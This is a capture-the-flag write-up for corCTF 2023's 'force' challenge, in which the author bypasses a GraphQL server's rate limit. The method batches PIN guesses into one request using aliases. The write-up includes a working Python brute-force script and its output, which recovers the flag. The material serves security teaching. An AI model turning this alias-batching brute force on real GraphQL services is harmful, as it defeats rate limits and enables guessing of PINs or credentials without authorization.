# force

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- 118 solves / 124 points
- Author: larry
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

Unbreakable vault door!

[Instancer](https://instancer.be.ax/challenge/web-force)

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731122313.png)

## Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/web/force/force.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/corCTF-2023/web/force)-[2023.07.31|12:31:22(HKT)]
└> file force.tar.gz 
force.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 51200
┌[siunam♥Mercury]-(~/ctf/corCTF-2023/web/force)-[2023.07.31|12:31:25(HKT)]
└> tar xf force.tar.gz    
┌[siunam♥Mercury]-(~/ctf/corCTF-2023/web/force)-[2023.07.31|12:31:41(HKT)]
└> ls -lah        
total 36K
drwxr-xr-x  3 siunam nam 4.0K Jul 31 12:31 .
drwxr-xr-x 10 siunam nam 4.0K Jul 29 22:45 ..
-rw-r--r--  1 siunam nam  109 Jan  1  1970 Dockerfile
-rw-r--r--  1 siunam nam  14K Jul 31 12:31 force.tar.gz
drwxr-xr-x  2 siunam nam 4.0K Jan  1  1970 src
```

**Dockerfile:**
```sh
FROM node:18

WORKDIR /app
COPY src/package* ./
RUN npm ci

COPY src/ .

CMD ["node", "--expose-gc", "web.js"]
```

This `Dockerfile` will pull the Node.js image from Docker, copy all the packages, web application's source code, and run `web.js` with garbage collector in Node.js.

**Run the challenge locally with exposed port `80`:**
```shell
┌[siunam♥Mercury]-(~/ctf/corCTF-2023/web/force)-[2023.07.31|12:39:36(HKT)]
└> sudo docker build -t force .                                         
[...]
Successfully built 06d8d8ef5246
Successfully tagged force:latest
┌[siunam♥Mercury]-(~/ctf/corCTF-2023/web/force)-[2023.07.31|12:40:21(HKT)]
└> sudo docker run -p 80:80 force:latest        
{"level":30,"time":1690778448201,"pid":1,"hostname":"162414d09221","msg":"Server listening at http://0.0.0.0:80"}
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731124125.png)

In here, we can submit a query, and it looks like a **GraphQL** query?

> Note: GraphQL is an API that when you send a query to the GraphQL endpoint, it'll response you with some data or modify some data.

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731124232.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731124413.png)

When we clicked the "query!" button, it'll send a POST request to `/` with the query.

Let's read the source code!

**web.js:**
```js
import fastify from 'fastify'
import mercurius from 'mercurius'
import { randomInt } from 'crypto'
import { readFile } from 'fs/promises'

const app = fastify({
    logger: true
});
const index = await readFile('./index.html', 'utf-8');

const secret = randomInt(0, 10 ** 5); // 1 in a 100k??

let requests = 10;

setInterval(() => requests = 10, 60000);

await app.register(mercurius, {
    schema: `type Query {
        flag(pin: Int): String
    }`,
    resolvers: {
        Query: {
            flag: (_, { pin }) => {
                if (pin != secret) {
                    return 'Wrong!';
                }
                return process.env.FLAG || 'corctf{test}';
            }
        }
    },
    routes: false
});

app.get('/', (req, res) => {
    return res.header('Content-Type', 'text/html').send(index);
});

app.post('/', async (req, res) => {
    if (requests <= 0) {
        return res.send('no u')
    }
    requests --;
    return res.graphql(req.body);
});

app.listen({ host: '0.0.0.0', port: 80 });
```

In `app.register()`, we can see that the Node.js's Fastify library `app` registered (created) a new scope, and it's using [Mercurius](https://mercurius.dev/) library, which is a [**GraphQL**](https://graphql.org/) adapter for [**Fastify**](https://www.fastify.io).

In the GraphQL's schema, it defines a **`flag` query with argument `pin`**.

If the `pin` is not equal to `secret`, it'll return `Wrong!`. **If it's correct, return the flag.**

**Hmm... What's the variable `secret`'s value?**
```js
const secret = randomInt(0, 10 ** 5); // 1 in a 100k??
```

It's a random integer between 0 to $10^5$ (100000).

**Uhh... Can we brute force the `pin`?**
```js
let requests = 10;

setInterval(() => requests = 10, 60000);
[...]
app.post('/', async (req, res) => {
    if (requests <= 0) {
        return res.send('no u')
    }
    requests --;
    return res.graphql(req.body);
});
```

So, when we send a POST request to `/`, it first **checks `requests` is less than or equal to 0**, the default value of `requests` is `10`. If it's less than or equal to 0, it'll response us with `no u`, and wait for 60 seconds to send request again.

If `requests` is **greater than 0**, `requests` will minus 1, and return the response of the GraphQL query.

That being said, POST endpoint `/` implemented a rate limit, with 10 requests within 60 seconds.

Luckily, we can easily bypass that!

## Exploitation

In GraphQL, there's one thing called "***Aliases***", which allows multiple queries being sent. 

Armed with above information, we can abuse the aliases to bypass rate limiting!

> Note: For more information, you can read this PortSwigger's Web Security Academy GraphQL lab: [https://portswigger.net/web-security/graphql#bypassing-rate-limiting-using-aliases](https://portswigger.net/web-security/graphql#bypassing-rate-limiting-using-aliases).

**To do so, we can send the following query using aliases:**
```
{
  flag0:flag(pin:0),
  flag1:flag(pin:1),
  flag2:flag(pin:2),
  flag3:flag(pin:3),
  flag4:flag(pin:4),
  flag5:flag(pin:5)
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731130738.png)

As you can see, we can send multiple queries at the same time!

**Let's write a Python (overkilled) script to automate that process!**
```python
#!/usr/bin/env python3
import requests
import json

class Exploit:
    def __init__(self, url):
        self.url = url

    @staticmethod
    def getQueryWithAliases(startPinNumber, endPinNumber):
        queryWithAliases = '{'
        for pinNumber in range(startPinNumber, endPinNumber + 1):
            if pinNumber == endPinNumber:
                # "," in the last query is not needed
                queryWithAliases += f'flag{pinNumber}:flag(pin:{pinNumber})'
                break
            queryWithAliases += f'flag{pinNumber}:flag(pin:{pinNumber}),'
        queryWithAliases += '}'

        return queryWithAliases

    def bypassRateLimit(self, startPinNumber, endPinNumber):
        queryWithAliases = Exploit.getQueryWithAliases(startPinNumber, endPinNumber)
        response = requests.post(self.url, json=queryWithAliases)
        if response.status_code != 200:
            print(f'\n[-] Query failed...')
            exit()
        if 'no u' in response.text:
            print(f'\n[-] Ahh... Rate limited... Please wait 60 seconds :(')
            exit()

        jsonResponse = json.loads(response.text)
        for key, value in jsonResponse['data'].items():
            isCorrectPin = True if value != 'Wrong!' else False
            if isCorrectPin:
                print(f'\n[+] Found correct PIN number {key[4:]}, flag: {value}')
                exit()

if __name__ == '__main__':
    isLocal = True
    url = ''
    if isLocal:
        url = 'http://localhost/'

    assert url, '[-] Please provide the remote instance\'s URL'
    exploit = Exploit(url)

    # I tried 50000 queries at one time, but it'll response 
    # HTTP status code "413 Request body is too large"
    PIN_NUMBER_RANGE = 20000
    SECRET_MINIMUM_INTEGER = 0
    SECRET_MAXIMUM_INTEGER = 10 ** 5
    for pinNumber in range(SECRET_MINIMUM_INTEGER, SECRET_MAXIMUM_INTEGER):
        if pinNumber % PIN_NUMBER_RANGE != 0:
            continue

        startPinNumber = pinNumber
        endPinNumber = startPinNumber + PIN_NUMBER_RANGE
        print(f'[*] Trying PIN number between {startPinNumber} to {endPinNumber}', end='\r')
        exploit.bypassRateLimit(startPinNumber, endPinNumber)
```

```shell
┌[siunam♥Mercury]-(~/ctf/corCTF-2023/web/force)-[2023.07.31|13:38:27(HKT)]
└> python3 solve.py
[*] Trying PIN number between 40000 to 60000
[+] Found correct PIN number 58114, flag: corctf{test}
```

**Nice! Let's spawn the remote instance and get the real flag!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731134158.png)

```python
if __name__ == '__main__':
    isLocal = False
    url = 'https://web-force-force-7b74f326dbf15733.be.ax/'
    if isLocal:
        url = 'http://localhost/'
    
```

```shell
┌[siunam♥Mercury]-(~/ctf/corCTF-2023/web/force)-[2023.07.31|13:40:14(HKT)]
└> python3 solve.py
[*] Trying PIN number between 60000 to 80000
[+] Found correct PIN number 65571, flag: corctf{S                T                  O               N                   K                 S}
```

- **Flag: `corctf{S                T                  O               N                   K                 S}`**

## Conclusion

What we've learned:

1. Bypassing Rate Limit Via GraphQL's Aliases (Batching Query)